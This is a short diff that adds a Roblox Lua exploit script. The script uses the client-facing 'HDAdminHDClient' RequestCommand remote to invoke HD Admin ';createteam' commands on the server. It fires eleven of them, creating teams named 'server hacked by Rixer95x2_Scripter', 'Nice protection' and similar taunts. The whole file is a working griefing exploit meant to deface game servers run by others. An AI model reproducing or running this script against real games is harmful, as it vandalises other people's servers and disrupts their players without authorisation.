@@ -1,0 +1,15 @@
+--team spam hd admin server hacked
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
+ 
+    RequestCommand:InvokeServer(";createteam red HAHA")
+	RequestCommand:InvokeServer(";createteam server hacked by Rixer95x2_Scripter")
+	RequestCommand:InvokeServer(";createteam db 🤑🤑🤑")
+	RequestCommand:InvokeServer(";createteam green Hacked")
+	RequestCommand:InvokeServer(";createteam hr 🤠")
+	RequestCommand:InvokeServer(";createteam pk Nice protection")
+	RequestCommand:InvokeServer(";createteam p server hacked")
+	RequestCommand:InvokeServer(";createteam y 🦧🦧🦧")
+	RequestCommand:InvokeServer(";createteam hacked by Rixer")
+	RequestCommand:InvokeServer(";createteam black hacked 💀💀")
+	RequestCommand:InvokeServer(";createteam white hacked")
